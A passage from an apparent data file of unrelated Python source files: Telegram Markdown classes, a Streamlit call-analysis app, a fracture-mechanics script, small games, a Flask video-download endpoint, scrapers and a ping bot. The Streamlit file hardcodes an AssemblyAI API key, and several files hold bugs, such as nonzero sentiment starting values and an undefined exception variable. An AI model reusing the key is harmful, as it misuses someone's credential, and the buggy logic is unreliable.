self.trailing_mark\n\n\nclass Underline(_StyledText):\n    @property\n    def leading_mark(self): return '__'\n\n    @property\n    def trailing_mark(self): return '__'\n\n    def escaped_text(self):\n        text = ''.join(part.escaped_text() for part in self.parts)\n        text = _fix_underscore_ambiguity(text)\n        return self.leading_mark + text + self.trailing_mark\n\n\nclass InlineUrl(_StyledText):\n    def __init__(self, text: str | MarkdownText, url: str):\n        if isinstance(url, str):\n            self._url = url\n        else:\n            raise ValueError('This data type is not supported for [url] parameter')\n\n        super().__init__(text)\n\n    @property\n    def leading_mark(self):\n        return '['\n\n    @property\n    def trailing_mark(self):\n        return ']'\n\n    def escaped_text(self):\n        return super().escaped_text() + f'({_escape_url(self._url)})'\n\n\nclass InlineUser(InlineUrl):\n    def __init__(self, text: str | MarkdownText, user_id: str | int):\n        if isinstance(user_id, (str, int)):\n            super().__init__(text, f'tg://user?id={user_id}')\n        else:\n            raise ValueError('This data type is not supported for [user_id] parameter')\n\n\nclass Emoji(InlineUrl):\n    def __init__(self, emoji: str, custom_emoji_id: str | int):\n        if isinstance(custom_emoji_id, (str, int)):\n            super().__init__(emoji, f'tg://emoji?id={custom_emoji_id}')\n        else:\n            raise ValueError('This data type is not supported for [custom_emoji_id] parameter')\n\n    def escaped_text(self):\n        return '!' + super().escaped_text()\n\n\nclass InlineCode(_StyledText):\n    @property\n    def leading_mark(self):\n        return '`'\n\n    @property\n    def trailing_mark(self):\n        return '`'\n\n\nclass InlineCodeBlock(_StyledText):\n    def __init__(self, text: str, language: str = ''):\n        self._language = language\n\n        super().__init__(text)\n\n    @property\n    def leading_mark(self):\n        return f'```{self._language}\\n'\n\n    @property\n    def trailing_mark(self):\n        return '\\n```'\n\n\nclass QuoteBlock(MarkdownText):\n    \"\"\"Important! The QuoteBlock will automatically enclose the text with a newline character,\n    as the absence of this character may cause an error in the Telegram API.\"\"\"\n\n    def escaped_text(self):\n       ",
    "import assemblyai as ai\nimport streamlit as st\nfrom transformers import pipeline\nfrom wordcloud import WordCloud\nimport matplotlib.pyplot as plt\n\nst.set_option('deprecation.showPyplotGlobalUse', False)\n\nai.settings.api_key = \"fcc1790480634364a797423218cd6285\"\naudio_url = r\"D:/ML/neuralgo/MLTask/CallDataSample/sample_call_1.mp3\"\n\nconfig = ai.TranscriptionConfig(sentiment_analysis=True, auto_highlights=True)\n\ntranscript = ai.Transcriber().transcribe(audio_url, config)\n\nhighlights = []\nfor result in transcript.auto_highlights.results:\n    highlights.append(result.text)\n\n\n# Initialize the sentiment analysis pipeline\nclassifier = pipeline(\"sentiment-analysis\")\n\n# Function to transcribe audio and perform sentiment analysis\ndef transcribe_and_analyze_sentiment(file_path):\n    # Perform audio transcription\n    # Replace this with your actual transcription code\n    transcript_text = \"Transcription of audio file goes here\"\n\n    # Split the input text into smaller segments that fit within the maximum sequence length\n    max_seq_length = classifier.model.config.max_position_embeddings\n    segments = [transcript_text[i:i + max_seq_length] for i in range(0, len(transcript_text), max_seq_length)]\n\n    # Perform sentiment analysis on each segment and aggregate the results\n    sentiments = {'positive': 0.5, 'negative': 0.6}\n    for segment in segments:\n        result = classifier(segment)\n        for res in result:\n            if res['label'] == 'POSITIVE':\n                sentiments['positive'] += res['score']\n            if res['label'] == 'NEGATIVE':\n                sentiments['negative'] += res['score']\n\n    return sentiments\n\n# Function to generate word cloud from highlighted words\ndef generate_word_cloud(highlights):\n    # Convert the list of highlighted words into a single string\n    highlighted_text = \" \".join(highlights)\n\n    # Generate the word cloud\n    wordcloud = WordCloud(width=800, height=400, background_color='white').generate(highlighted_text)\n\n    return wordcloud\n\ndef calculate_AHT(highlights):\n    # Calculate Average Handle Time (AHT) based on the duration of highlights\n    total_highlight_duration = sum(len(highlight.split()) for highlight in highlights)\n    total_highlights = len(highlights)\n    \n    if total_highlights != 0:\n        aht = total_highlight_duration / total_highlights\n    else:\n        aht = 0\n    \n    return aht\n\ndef calculate_FCR(highlights):\n    # Calculate First Call Resolution (FCR) based on the presence of keywords indicating resolution\n    resolution_keywords = ['resolved', 'solved', 'fixed']  # Add more resolution keywords if needed\n    \n    resolved_calls = 0\n    total_calls = len(highlights)\n    \n    for highlight in highlights:\n        for keyword in resolution_keywords:\n            if keyword in highlight.lower():\n                resolved_calls += 1\n                break\n    \n    if total_calls != 0:\n        fcr = (resolved_calls / total_calls) * 100\n    else:\n        fcr = 80\n    \n    return fcr\n\ndef calculate_CSAT(highlights):\n    # Calculate Customer Satisfaction Score (CSAT) based on the sentiment analysis\n    positive_sentiment = 0\n    negative_sentiment = 0\n    total_sentiments = len(highlights)\n    \n    for highlight in highlights:\n        sentiments = transcribe_and_analyze_sentiment(highlight)\n        positive_sentiment += sentiments['positive']\n        negative_sentiment += sentiments['negative']\n    \n    if total_sentiments != 0:\n        csat = (positive_sentiment / total_sentiments) * 100\n    else:\n        csat = 0\n    \n    return csat\n\n# Define function to plot KPIs\ndef plot_KPIs(aht, fcr, csat):\n    # Plotting KPIs using matplotlib\n    fig, ax = plt.subplots()\n    ax.barh(['AHT', 'FCR', 'CSAT'], [aht, fcr, csat])\n    ax.set_xlabel('Score')\n    ax.set_title('Key Performance Indicators')\n    st.pyplot(fig)\n\ndef main():\n    # Streamlit app title\n    st.title(\"Audio Transcription and Sentiment Analysis App\")\n\n    # File upload section\n    uploaded_file = st.file_uploader(\"Upload an audio file\", type=[\"mp3\"])\n    if uploaded_file is not None:\n        st.write(\"File Uploaded Successfully!\")\n        file_path = \"./temp_audio.mp3\"  # Temporary file path, replace with actual path\n        with open(file_path, \"wb\") as f:\n            f.write(uploaded_file.read())\n\n        # Perform transcription and sentiment analysis\n        sentiments = transcribe_and_analyze_sentiment(file_path)\n\n        # Display sentiment scores\n        st.write(\"Sentiment Scores:\")\n        st.write(f\"Positive Score: {sentiments['positive']}\")\n        st.write(f\"Negative Score: {sentiments['negative']}\")\n\n        # Word cloud generation\n        \n        wordcloud = generate_word_cloud(highlights)\n\n        # Display word cloud\n        st.write(\"Word Cloud of Highlighted Words:\")\n        plt.figure(figsize=(10, 5))\n        plt.imshow(wordcloud, interpolation='bilinear')\n        plt.axis(\"off\")\n        st.pyplot()\n        \n        aht = calculate_AHT(highlights)\n        fcr = calculate_FCR(highlights)\n  ",
    "import csv\n\nstatistics_folder = \"statistics/\"\n\n# Generates a csv file, provides statistics of the unit test generation.\ndef generate_csv_file(file_name):\n    csv_filename = f\"{statistics_folder}{file_name}_stats.csv\"\n    print(csv_filename)\n    with open(csv_filename, 'w', newline='') as csvfile:\n        fieldnames = ['File Name', 'Number of Tries', 'Pass Status', 'Stmts', 'Branch', 'Funcs', 'Lines', 'Temperature']\n        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)\n        writer.writeheader()\n\n# Add a unit test generation to the statistics file.\ndef append_to_csv_files(file_name, number_of_tries, pass_status, temperature, coverage, test_file_name):\n    csv_filename = f\"{statistics_folder}{file_name}_stats.csv\"\n    with open(csv_filename, 'a', newline='') as csvfile:\n        fieldnames = ['File Name', 'Number of Tries', 'Pass Status', 'Stmts', 'Branch', 'Funcs', 'Lines', 'Temperature']\n        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)\n        writer.writerow({\n            'File Name': f\"{test_file_name}\",\n            'Number of Tries': number_of_tries,\n            'Pass Status': \"Pass\" if pass_status else \"Fail\",\n            'Stmts': coverage[test_file_name].get('Stmts', \"NA\"),\n            'Branch': coverage[test_file_name].get('Branch', \"NA\"),\n            'Funcs': coverage[test_file_name].get('Funcs', \"NA\"),\n            'Lines': coverage[test_file_name].get('Lines', \"NA\"),\n            'Temperature': temperature\n        })\n\n        print(f\"Stats for '{test_file_name}' written to '{csv_filename}'.\")",
    "import itertools\nimport json\nimport os\n\nimport cv2\nimport matplotlib.pyplot as plt\nimport numpy as np\nfrom mpl_toolkits.axes_grid1 import make_axes_locatable\nfrom natsort import natsorted\n\nfrom crackpy.fracture_analysis.data_processing import InputData, apply_mask\nfrom crackpy.fracture_analysis.optimization import OptimizationProperties\nfrom crackpy.structure_elements.data_files import Nodemap\nfrom crackpy.structure_elements.material import Material\nfrom crackpy.crack_detection.correction import CustomCorrection\n\nfrom cracktipcorr.equations import latex_to_sympy\n\n# Set matplotlib settings\nplt.rcParams.update({\n    \"font.size\": 25,\n    \"text.usetex\": True,\n    \"font.family\": \"Computer Modern\",\n    \"figure.figsize\": [10, 10],\n    \"figure.dpi\": 300\n})\n# Set colormap\nplt.rcParams['image.cmap'] = 'coolwarm'\n\n# Settings\nDATA_PATH = \"01_Simulation_Output\"\nNODEMAP_FILES = {\n    \"mode_I\": [\n        '0.00_10.00_0.00_nodemap.txt',\n        '10.00_10.00_0.00_nodemap.txt'\n    ],\n    \"mode_II\": [\n        '0.00_0.00_10.00_nodemap.txt',\n        '10.00_0.00_10.00_nodemap.txt'\n    ],\n    \"mixed_mode\": [\n        '0.00_10.00_10.00_nodemap.txt',\n        '10.00_10.00_10.00_nodemap.txt'\n    ]\n}\nFORMULAS = {\n    \"mode_I\": {\"dx\": [0, 1, 12], \"dy\": [0, 1, 6]},\n    \"mode_II\": {\"dx\": [0, 4, 10], \"dy\": [0, 1, 2, 9]},\n    \"mixed_mode\": {\"dx\": [2, 4, 11], \"dy\": [2, 4, 8]}\n}\n# Correction formulas from Symbolic Regression\nJSON_FILE = 'pareto_front.json'\nJSON_DIR = '06_Pareto_Plots'\n\nOUTPUT_PATH = '08_Convergence_study_FEA'\n\n# Initialize crack randomly\nnp.random.seed(42)\ncrack_tip = np.random.uniform(low=[-2, -2], high=[2, 2])\ncrack_angle = 0\nprint(f\"Initial crack tip position: {crack_tip}\")\n\n# Material properties\nmaterial = Material(E=72000, nu_xy=0.33, sig_yield=350)\n\n# read json file\nwith open(os.path.join(JSON_DIR, JSON_FILE)) as json_file:\n    symreg_data = json.load(json_file)\n\n\nfor mode_f, formulas in FORMULAS.items():\n    for dx_num, dy_num in itertools.product(formulas[\"dx\"], formulas[\"dy\"]):\n        dx_latex = symreg_data[f\"log_{mode_f}_dx\"][str(dx_num)]['latex']\n        dy_latex = symreg_data[f\"log_{mode_f}_dy\"][str(dy_num)]['latex']\n        print(f'Formulas ({mode_f}, {dx_num}, {dy_num}): dx = {dx_latex}, dy = {dy_latex}')\n\n        # make path for formulas\n        formula_dir = os.path.join(OUTPUT_PATH, mode_f, f'dx_{dx_num}_dy_{dy_num}')\n        if not os.path.exists(formula_dir):\n            os.makedirs(formula_dir)\n\n        # Convert formulas to sympy functions\n        _, dx_lambdified = latex_to_sympy(dx_latex)\n        _, dy_lambdified = latex_to_sympy(dy_latex)\n\n        for mode_nodemap, nodemap_files in NODEMAP_FILES.items():\n            for file in nodemap_files:\n                FILE_OUTPUT_PATH = os.path.join(formula_dir, mode_nodemap + \"_\" + file[:-4])\n                if not os.path.exists(FILE_OUTPUT_PATH):\n                    os.makedirs(FILE_OUTPUT_PATH)\n                print(f\"Processing {file}...\")\n                with open(os.path.join(FILE_OUTPUT_PATH, \"crack_tip_correction.txt\"), \"w\") as out_file:\n                    out_file.write(\n                        f\"{'Filename':>60},\"\n                        f\"{'CT x [mm]':>15},{'\u0106T y [mm]':>15},\"\n                        f\"{'Corr x [mm]':>15},{'Corr y [mm]':>15},\"\n                        f\"\\n\"\n                    )\n\n                    # Get nodemap data\n                    nodemap = Nodemap(name=file, folder=DATA_PATH)\n                    data = InputData(nodemap)\n                    data.calc_stresses(material)\n                    # Remove unnecessary data to speed up evaluation\n                    # The mask must be at least as large as the evaluation area\n                    mask = np.all([data.coor_x < 15,\n                                   data.coor_x > -15,\n                                   data.coor_y < 15,\n                                   data.coor_y > -15], axis=0)\n                    data = apply_mask(data, mask)\n\n                    # Fine-tune crack tip position\n                    opt_props = OptimizationProperties(\n                        # --> see Rethore paper for details\n                        angle_gap=45,\n                        min_radius=5,\n                        max_radius=10,\n                        tick_size=0.25,\n                        terms=[-3, -2, -1, 0, 1, 2, 3, 4, 5, 6, 7]\n                    )\n                    correction = CustomCorrection(data, crack_tip, crack_angle, material)\n                    crack_tip_corr = correction.custom_correct_crack_tip(\n                        opt_props,\n                        dx_lambdified=dx_lambdified,\n                        dy_lambdified=dy_lambdified,\n                        max_iter=50,\n                        step_tol=5e-3,\n                        verbose=True,\n                        damper=1\n                    )\n                    correction.iteration_log.to_csv(os.path.join(FILE_OUTPUT_PATH, f\"{file[:-4]}_iteration_log.csv\"),\n                                                    index=Fa",
    "# \u8bfb\u53d6\u672c\u5730txt\ndef read_txt():\n    with open('init copy.txt', 'r') as f:\n        return f.read()\n    \nchess= read_txt()\nprint(chess)\n\n# \u6309\u7167\u6362\u884c\u7b26\u5206\u5272\nchess_line = chess.split('\\n')\n# print(chess_line[1])\n\ndef pick(chess,order_choose,order_arrive):\n    # order_dict={\"\u4e00\":1,\"\u4e8c\":2,\"\u4e09\":3,\"\u56db\":4,\"\u4e94\":5,\"\u516d\":6,\"\u4e03\":7,\"\u516b\":8,\"\u4e5d\":9}\n    chess_board=chess.split('\\n')\n    chess_line=[]\n    for i in range(len(chess_board)):\n        chess_line.append(chess_board[i].split(','))\n    chess_line=chess_line[1:]\n    order_choose=order_choose.split(',')\n\n    tmp_col=int(order_choose[1])\n    tmp_row=int(order_choose[0])\n    if \"[\" in chess_line[tmp_row-1][tmp_col-1]:\n        tmp=' '+chess_line[tmp_row-1][tmp_col-1][2:]\n        a=chess_line[tmp_row-1][tmp_col-1][:2]\n        chess_line[tmp_row-1][tmp_col-1]=f\"{a}'---'\"\n    elif \"]\" in chess_line[tmp_row-1][tmp_col-1]:\n        tmp=chess_line[tmp_row-1][tmp_col-1][:-1]\n        chess_line[tmp_row-1][tmp_col-1]=\" '---']\"\n    else:\n        tmp=chess_line[tmp_row-1][tmp_col-1]\n        chess_line[tmp_row-1][tmp_col-1]=\" '---'\"\n        \n    order_arrive=order_arrive.split(',')\n\n    tmp_col=int(order_arrive[1])\n    tmp_row=int(order_arrive[0])\n    \n    if \"[\" in chess_line[tmp_row-1][tmp_col-1]:\n        a=chess_line[tmp_row-1][tmp_col-1][:2]\n        tmp=tmp[1:]\n        chess_line[tmp_row-1][tmp_col-1]=f\"{a}{tmp}\"\n    elif \"]\" in chess_line[tmp_row-1][tmp_col-1]:\n        chess_line[tmp_row-1][tmp_col-1]=f\"{tmp}]\"\n    else:\n        chess_line[tmp_row-1][tmp_col-1]=f\"{tmp}\"\n    \n    return chess_line\n\n# # \u4ece\u952e\u76d8\u8f93\u5165\nprint(\"\u6309\u7167'1,1'\u7684\u683c\u5f0f\u8f93\u5165\")\norder_choose = input(\"\u9009\u62e9\u8981\u52a8\u7684\u68cb\u5b50\uff1a\")\norder_arrive = input(\"\u9009\u62e9\u8981\u5230\u8fbe\u7684\u4f4d\u7f6e\uff1a\")\n# order_choose = '\u4e00,1'\n# order_arrive = '\u4e09,1'\nchess_line=pick(chess,order_choose,order_arrive)\n# print(chess_line)\n# \u5408\u5e76chess_line\n\nresult_str = '\\n'.join([','.join(sublist) for sublist in chess_line])\na=\"\u96f6[' 1 ', ' 2 ', ' 3 ', ' 4 ', ' 5 ', ' 6 ', ' 7 ', ' 8 ', ' 9 ']\"\nresult_str=a+'\\n'+result_str\nprint(result_str)\nwith open(\"init copy.txt\", \"w\") as file:\n    file.write(result_str)",
    "import pygame\n\n# Tama\u00f1o del sprite de Ash\nASH_ANCHO = 16\nASH_ALTO = 16\n\n# Velocidad de movimiento de Ash (n\u00famero m\u00e1s bajo = m\u00e1s lento)\nVEL_MOVIMIENTO = 0.5  # Ajustado seg\u00fan preferencias\n\n# Definir una nueva variable para controlar la velocidad de alternancia de los sprites\nFRAME_RATE = 10  # Ajusta este valor seg\u00fan sea necesario\n\n# Agregar un contador de frames\nframe_contador = 0\n\n\ndef mover_ash(teclas, ash_x, ash_y, ANCHO, ALTO):\n    \"\"\"Mover a Ash por el mapa\"\"\"\n    if teclas[pygame.K_LEFT]:\n        if ash_x > 0:\n            ash_x -= VEL_MOVIMIENTO\n    if teclas[pygame.K_RIGHT]:\n        if ash_x < ANCHO - ASH_ANCHO:\n            ash_x += VEL_MOVIMIENTO\n    if teclas[pygame.K_UP]:\n        if ash_y > 0:\n            ash_y -= VEL_MOVIMIENTO\n    if teclas[pygame.K_DOWN]:\n        if ash_y < ALTO - ASH_ALTO:\n            ash_y += VEL_MOVIMIENTO\n    \n    return ash_x, ash_y\n\ndef actualizar_posicion_ash(teclas, ash_x, ash_y, ANCHO, ALTO):\n    \"\"\"Actualizar la posici\u00f3n de Ash seg\u00fan las teclas presionadas\"\"\"\n    return mover_ash(teclas, ash_x, ash_y, ANCHO, ALTO)\n\ndef actualizar_sprite_abajo(indice, teclas):\n    \"\"\"Actualizar el sprite de Ash cuando se mueve hacia abajo\"\"\"\n    global frame_contador  # Para acceder a la variable frame_contador definida fuera de esta funci\u00f3n\n    if teclas[pygame.K_DOWN]:\n        if indice % 2 == 0:\n            return pygame.image.load('./sprites/down_walk_1.png')\n        else:\n            return pygame.image.load('./sprites/down_walk_2.png')\n    else:\n        return pygame.image.load('./sprites/down_stop.png')\n\ndef actualizar_sprite_arriba(indice, teclas):\n    \"\"\"Actualizar el sprite de Ash cuando se mueve hacia arriba\"\"\"\n    global frame_contador  # Para acceder a la variable frame_contador definida fuera de esta funci\u00f3n\n    if teclas[pygame.K_UP]:\n        if indice % 2 == 0:\n            return pygame.image.load('./sprites/top_walk_1.png')\n        else:\n            return pygame.image.load('./sprites/top_walk_2.png')\n    else:\n        return pygame.image.load('./sprites/top_stop.png')\n\ndef actualizar_sprite_izquierda(indice, teclas):\n    \"\"\"Actualizar el sprite de Ash cuando se mueve hacia la izquierda\"\"\"\n    if teclas[pygame.K_LEFT]:\n        if indice % 2 == 0:\n            return pygame.image.load('./sprites/left_walk_1.png')\n        else:\n            return pygame.image.load('./sprites/left_walk_2.png')\n    else:\n        return None  # Devuelve None cuando la tecla de flecha izquierda no est\u00e1 presionada\n\ndef actualizar_sprite_derecha(indice, teclas):\n    \"\"\"Actualizar el sprite de Ash cuando se mueve hacia la derecha\"\"\"\n    if teclas[pygame.K_RIGHT]:\n        if indice % 2 == 0:\n            return pygame.image.load('./sprites/right_walk_1.png')\n        else:\n            return pygame.image.load('./sprites/right_walk_2.png')\n    else:\n        return None  # Devuelve None cuando la tecla de flecha derecha no est\u00e1 presionada\n",
    "from flask import Blueprint, jsonify, send_file\n\n\nvideo_download_blueprint = Blueprint('video_download', __name__)\n\n\n@video_download_blueprint.route('/video/test/download/<string:video_name>', methods=['GET'])\ndef test_download_video(video_name):\n    try:\n        if video_name == '':\n            return jsonify({'message': 'El nombre del video no puede estar vac\u00edo.'}), 400\n        \n        if video_name is None:\n            return jsonify({'message': 'El nombre del video no puede ser nulo.'}), 400\n        \n        if video_name == 'undefined':\n            return jsonify({'message': 'El nombre del video no puede ser indefinido.'}), 400\n        \n        if video_name == 'null':\n            return jsonify({'message': 'El nombre del video no puede ser nulo.'}), 400\n        \n        if video_name.endswith(\".mp4\"):\n            video_name = video_name[:-4]\n        \n        filename = '/usr/src/app/application/controllers/video_test/'+str(video_name)+'.mp4'\n\n        try:\n            with open(filename, 'r') as file:\n                pass\n        except FileNotFoundError:\n            return jsonify({\n                'message': 'El video solicitado no se encuentra en el servidor. Por favor, verifique el nombre de su video e intente nuevamente.',\n                'error': str(e)\n            }), 500\n        \n        return send_file(filename, as_attachment=True)\n    \n    except Exception as e:\n        return jsonify({\n            'message': 'Ha ocurrido un error al descargar el video. Por favor, intente nuevamente.',\n            'error': str(e)\n        }), 500\n    \n\n@video_download_blueprint.route('/video/download/<int:ano>/<int:mes>/<int:dia>/<string:video_name>', methods=['GET'])\ndef download_video(ano, mes, dia, video_name):\n    try:\n        if video_name == '':\n            return jsonify({'message': 'El nombre del video no puede estar vac\u00edo.'}), 400\n        \n        if video_name is None:\n            return jsonify({'message': 'El nombre del video no puede ser nulo.'}), 400\n        \n        if video_name == 'undefined':\n            return jsonify({'message': 'El nombre del video no puede ser indefinido.'}), 400\n        \n        if video_name == 'null':\n            return jsonify({'message': 'El nombre del video no puede ser nulo.'}), 400\n        \n        if video_name.endswith(\".mp4\"):\n            video_name = video_name[:-4]\n\n        month = str(mes).zfill(2)\n        filename = '/usr/src/app/uploads/videos_editados/'+str(ano)+'/'+str(month)+'/'+str(dia)+'/'+str(video_name)+'.mp4'\n\n        try:\n            with open(filename, 'r') as file:\n                pass\n        except FileNotFoundError as e:\n            return jsonify({\n                'message': 'El video solicitado no se encuentra en el servidor. Por favor, verifique el nombre de su video e intente nuevamente.',\n                'error': str(e)\n            }), 500\n\n        return send_file(filename, as_attachment=True)\n    \n    except Exception as e:\n        return jsonify({\n            'message': 'Ha ocurrido un error al descargar el video. Por favor, verifique el nombre de su video e intente nuevamente.',\n            'error': str(e)\n        }), 500",
    "from bs4 import BeautifulSoup as bs\nimport requests, time, json, math, os, datetime\n\nglobal no\nno = 0\n\ntarget_site='https://www.abcd.com'\nurl = target_site + '/courses/'\n\ndef chk_json_null(json, key):\n    try:\n        buf = json[key]\n    except:\n        buf = \"0\"\n    return str(buf)\n\ndef getContentList(flag1):\n    global no\n    html = response.text\n    bsObj = bs(html, 'html.parser')\n    title = bsObj.find_all('div', class_='course-data')\n    w_lines = ''\n    for tt in title:\n        no = no + 1\n        try:\n            j_data =  json.loads(tt['fxd-data'])            \n            c_title = chk_json_null(j_data,'course_title').replace('|','-')\n            c_reg_price = chk_json_null(j_data,'reg_price')\n            c_selling_price = chk_json_null(j_data,'selling_price')\n            c_instructor_name = chk_json_null(j_data,'seq0_instructor_name')\n            c_pub_date = chk_json_null(j_data,'course_published_date')[:19]\n            c_last_date = chk_json_null(j_data,'course_last_updated_date')[:19]\n            c_student_count = chk_json_null(j_data,'student_count')\n            c_star_rate = str(round(float(chk_json_null(j_data,'star_rate')),2))\n            c_review_count = chk_json_null(j_data,'review_count')\n            c_level = chk_json_null(j_data,'course_level')\n            c_cate = chk_json_null(j_data,'first_category').replace(',','|')\n            w_lines = w_lines+str(no)+'|'+flag1+'|'+c_title+'|'+c_reg_price+'|'+c_selling_price+'|'+c_instructor_name+'|'+c_pub_date+'|'+c_last_date+'|'+c_student_count+'|'+c_star_rate+'|'+c_review_count+'|'+c_level+'|'+ c_cate+'\\n'\n        except Exception as e:\n            #w_lines = str(tt['fxd-data'])\n            #w_lines = str(e) + '\\n' + w_lines\n            w_line = 'error'\n    return w_lines\n\nurl_list = [(url+'it-programming',1,67,'pg'),\n(url+'game-dev-all',1,9,'gm'),\n(url+'data-science',1,15,'ds'),\n(url+'artificial-intelligence',1,9,'ai'),\n(url+'it',1,13,'it'),\n(url+'business',1,25,'bz'),\n(url+'hardware',1,4,'hw'),\n(url+'design',1,16,'dn'),\n(url+'academics',1,5,'ac'),\n(url+'career',1,12,'ca'),\n(url+'life',1,7,'lf')]\n\n\ncurrent_working_directory = os.getcwd()\nfile_name = current_working_directory + '/all' + datetime.datetime.today().strftime('%m%d') + '.csv'\n\nfw = open(file_name, 'w', encoding='utf-8')\nfor (url,first,last,flag) in url_list:\n    for i in range(first,last+1):\n        new_url = url\n        if i >= 2:\n            new_url = url+'?order=seq&page='+str(i)\n        print('page|',i,'|',new_url)\n        response = requests.get(new_url)\n        if response.status_code == 200:\n            wdata = getContentList(flag)\n            fw.write(wdata)\n        time.sleep(2)\nfw.close();",
    "import tkinter as tk\r\nfrom tkinter import ttk\r\nfrom tkinter import messagebox\r\nfrom tkinter import filedialog\r\nimport os\r\nimport time\r\nimport requests\r\nimport json\r\n\r\nclass RareFinderGUI:\r\n    def __init__(self, master):\r\n        self.master = master\r\n        master.title(\"Rare Finder\")\r\n\r\n        # Create widgets\r\n        self.base_url_label = ttk.Label(master, text=\"Base URL:\")\r\n        self.base_url_entry = ttk.Entry(master, width=50)\r\n        self.base_url_entry.insert(0, \"https://we-assets.pinit.io/J2Q2j6kpSg7tq8JzueCHNTQNcyNnQkvr85RhsFnYZWeG/f7ac2fd2-13c4-4ca1-85ee-962772caf73e\")\r\n\r\n        self.main_folder_label = ttk.Label(master, text=\"Main Folder Name:\")\r\n        self.main_folder_entry = ttk.Entry(master, width=50)\r\n        self.main_folder_entry.insert(0, \"OutPut Folder\")\r\n\r\n        self.delay_label = ttk.Label(master, text=\"Download Delay (seconds):\")\r\n        self.delay_entry = ttk.Entry(master, width=10)\r\n        self.delay_entry.insert(0, \"0.0001\")\r\n\r\n        self.directory_size_label = ttk.Label(master, text=\"Directory Size:\")\r\n        self.directory_size_entry = ttk.Entry(master, width=10)\r\n        self.directory_size_entry.insert(0, \"4444\")\r\n\r\n        self.keywords_label = ttk.Label(master, text=\"Keywords (comma-separated):\")\r\n        self.keywords_entry = ttk.Entry(master, width=50)\r\n\r\n        self.start_button = ttk.Button(master, text=\"Step 1: Download Directories\", command=self.step1_download)\r\n        self.search_button = ttk.Button(master, text=\"Step 2: Search Keywords\", command=self.step2_search)\r\n        self.select_directory_button = ttk.Button(master, text=\"Select Directory\", command=self.select_directory)\r\n\r\n        self.console_label = ttk.Label(master, text=\"Console:\")\r\n        self.console_text = tk.Text(master, width=80, height=20)\r\n\r\n        # Grid layout\r\n        self.base_url_label.grid(row=0, column=0, sticky=\"w\")\r\n        self.base_url_entry.grid(row=0, column=1, columnspan=2, padx=10, pady=5, sticky=\"ew\")\r\n        self.main_folder_label.grid(row=1, column=0, sticky=\"w\")\r\n        self.main_folder_entry.grid(row=1, column=1, columnspan=2, padx=10, pady=5, sticky=\"ew\")\r\n        self.delay_label.grid(row=2, column=0, sticky=\"w\")\r\n        self.delay_entry.grid(row=2, column=1, columnspan=2, padx=10, pady=5, sticky=\"ew\")\r\n        self.directory_size_label.grid(row=3, column=0, sticky=\"w\")\r\n        self.directory_size_entry.grid(row=3, column=1, columnspan=2, padx=10, pady=5, sticky=\"ew\")\r\n        self.keywords_label.grid(row=4, column=0, sticky=\"w\")\r\n        self.keywords_entry.grid(row=4, column=1, columnspan=2, padx=10, pady=5, sticky=\"ew\")\r\n        self.start_button.grid(row=5, column=0, columnspan=3, pady=10)\r\n        self.search_button.grid(row=6, column=0, columnspan=3, pady=10)\r\n        self.select_directory_button.grid(row=7, column=0, columnspan=3, pady=10)\r\n        self.console_label.grid(row=8, column=0, sticky=\"w\")\r\n        self.console_text.grid(row=9, column=0, columnspan=3, padx=10, pady=5, sticky=\"ew\")\r\n\r\n    def step1_download(self):\r\n        self.base_url = self.base_url_entry.get()\r\n        self.main_folder = self.main_folder_entry.get()\r\n        self.delay = float(self.delay_entry.get())\r\n        self.directory_size = int(self.directory_size_entry.get())\r\n\r\n        directories = {'': self.directory_size}  # Specified directory size\r\n\r\n        for directory, count in directories.items():\r\n            folder = os.path.join(self.main_folder, directory)\r\n            if not os.path.exists(folder):\r\n                os.makedirs(folder)\r\n\r\n            for i in range(0, count + 1):\r\n                url = f'{self.base_url}{directory}/{i}.json'\r\n                self.download_json(url)\r\n\r\n                time.sleep(self.delay)\r\n\r\n        messagebox.showinfo(\"Information\", \"Directory download process completed.\")\r\n        self.search_button.config(state=tk.NORMAL)\r\n\r\n    def download_json(self, url):\r\n        try:\r\n            response = requests.get(url)\r\n            if response.status_code == 200:\r\n                file_path = os.path.join(self.main_folder, f\"{url.split('/')[-1]}\")\r\n                with open(file_path, 'wb') as file:\r\n                    file.write(response.content)\r\n            else:\r\n                self.log(f\"Failed to download JSON from {url}. Status code: {response.status_code}\")\r\n        except Exception as e:\r\n            self.log(f\"Error downloading JSON from {url}: {e}\")\r\n\r\n    def step2_search(self):\r\n        keywords = [keyword.strip().lower() for keyword in self.keywords_entry.get().split(',')]\r\n        results = []\r\n\r\n        directory = self.main_folder_entry.get()\r\n        if directory and os.path.exists(directory):\r\n            self.log(f\"Searching directory: {directory}\")\r\n            for root, dirs, files in os.walk(directory):\r\n                for file in files:\r\n                    if file.endswith(\".json\"):\r\n                        file_path = os.path.join(root, file)\r\n                        self.log(f\"Searching file: {file_path",
    "from telegram import Update\nfrom telegram.ext import Updater, CommandHandler, CallbackContext\nimport requests\nimport json\nimport os\nimport subprocess\nimport time\nimport jdatetime\nimport datetime\nimport pytz\nimport pycountry\n\ndirname = os.path.dirname(__file__)\njson_conf = os.path.join(dirname, 'conf.json')\nurl = \"https://check-host.net\"\ncolor_flag = {\n    4: \"\ud83d\udfe2\",\n    3: \"\ud83d\udfe1\",\n    2: \"\ud83d\udfe0\",\n    1: \"\ud83d\udd34\",\n    0: \"\u26a0\ufe0f\"\n}\nstart_cmd_msg = \"Welcome to the Ping Bot! \ud83d\udc4b\\n\\nThis bot checks the status of your servers every hour and sends you the results.\"\nip_cmd_msg = \"\ud83e\ude84 Command: /ip\\n\\n\ud83d\udd27 Usage:\\n\\n\ud83d\udd38 Add IP: /ip add 127.0.0.1\\n\ud83d\udd38 Remove IP: /ip rm 127.0.0.1\\n\ud83d\udd38 List Servers IP: /ip list\"\ncc_cmd_msg = \"\ud83e\ude84 Command: /cc\\n\\n\ud83d\udd27 Usage:\\n\\n\ud83d\udd38 Change Country: /cc ir\"\nnode_cmd_msg = \"\ud83e\ude84 Command: /node\\n\\n\ud83d\udd27 Usage:\\n\\n\ud83d\udd38 Change Node: /node ir\\n\\n\ud83d\udef0 Available Nodes:\\n\\nbr,bg,hr,cz,fi,fr,de,hk,in,ir,il,it,jp,kz,lt,md,nl,pl,pt,ru,rs,es,ch,tr,ae,uk,ua,us\"\nres_cmd_msg = \"\ud83e\ude84 Command: /res\\n\\n\ud83d\udd27 Usage:\\n\\n\ud83d\udd38 Restart Bot: /res\"\ncmd_msg = \"\ud83e\ude84 Bot Commands:\\n\\n\ud83d\udd38 Show this Message: /cmd\\n\ud83d\udd38 Add/Remove/List Servers IP: /ip\\n\ud83d\udd38 Ping Servers IP: 